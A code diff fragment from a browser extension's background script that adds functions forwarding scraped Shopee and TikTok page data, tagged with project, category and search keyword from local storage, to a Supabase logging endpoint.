+        username: payloadData.username || "scraperbot",
+        data_type: payloadData.api_url
+          ? payloadData.api_url.split("/api/v4/")[1] || "pdp.get_pc"
+          : "pdp.unknown",
+        page_url: payloadData.page_url || "unknown",
+        api_url: payloadData.api_url || "",
+        raw_payload: payloadData,
+
+        // SUNTIKAN INTEGRASI BARU UNTUK MULTI-TENANT AVALON
+        project_id: projectId,
+        category_group: categoryGroup,
+        search_query: searchQuery,
+      };
+
+      const res = await Promise.race([
+        fetch(SUPABASE_LOGS_ENDPOINT, {
+          method: "POST",
+          cache: "no-cache",
+          headers: {
+            "Content-Type": "application/json",
+            apikey: SUPABASE_ANON_KEY,
+            Authorization: `Bearer ${SUPABASE_ANON_KEY}`,
+          },
+          body: JSON.stringify(supabasePayload),
+        }),
+        new Promise((_, reject) =>
+          setTimeout(() => reject(new Error("Timeout")), 10000),
+        ),
+      ]);
+      return { ok: res.ok, status: res.status };
+    } catch (t) {
+      console.error("[Avalon Background] Gagal kirim webhook Shopee:", t);
+      return { ok: false, status: 500, error: String(t) };
+    }
+  }
+
+  async function Dt(e) {
+    try {
+      // FIX 1: Bongkar bungkus objek payload TikTok secara presisi
+      const payloadData = e.payload || e.data || e;
+
+      // FIX 2: Tarik data identitas SaaS dari storage
+      const storage = await chrome.storage.local.get([
+        "project_id",
+        "category_group",
+        "keyword",
+      ]);
+      const projectId = storage.project_id || "PRJ-UNASSIGNED";
+      const categoryGroup = storage.category_group || "General";
+      const searchQuery = storage.keyword || "unknown";
+
+      const supabasePayload = {
+        email: payloadData.email || "bot@extension.local",
+        username: payloadData.username || "tiktok",
+        data_type: "router.data",
+        page_url: payloadData.page_url || "unknown",
+        api_url: payloadData.api_url || "tiktok/router/data",
+        raw_payload: payloadData,
+
+        // SUNTIKAN INTEGRASI BARU UNTUK MULTI-TENANT AVALON (TIKTOK VECTORS)
+        project_id: projectId,
+        category_group: categoryGroup,
+        search_query: searchQuery,
+      };
+
+      const res = await Promise.race([
+        fetch(SUPABASE_LOGS_ENDPOINT, {
+          method: "POST",
+          cache: "no-cache",
+          headers: {
+            "Content-Type": "application/json",
+            apikey: SUPABASE_ANON_KEY,
+            Authorization: `Bearer ${SUPABASE_ANON_KEY}`,
+          },
+          body: JSON.stringify(supabasePayload),
+        }),
+        new Promise((_, reject) =>
+          setTimeout(() => reject(new Error("Timeout")), 10000),
+        ),
+      ]);
+      return { ok: res.ok, status: res.status };
+    } catch (t) {
+      console.error("[Avalon Background] Gagal kirim webhook TikTok:", t);
+      return { ok: false, status: 500, error: String(t) };
+    }
+  }
+
   let be;
   try {
     ((be = Ot.main()),
@@ -3523,3 +3757,4 @@ var background = (function () {
   }
   return be;
 })();
+background; 
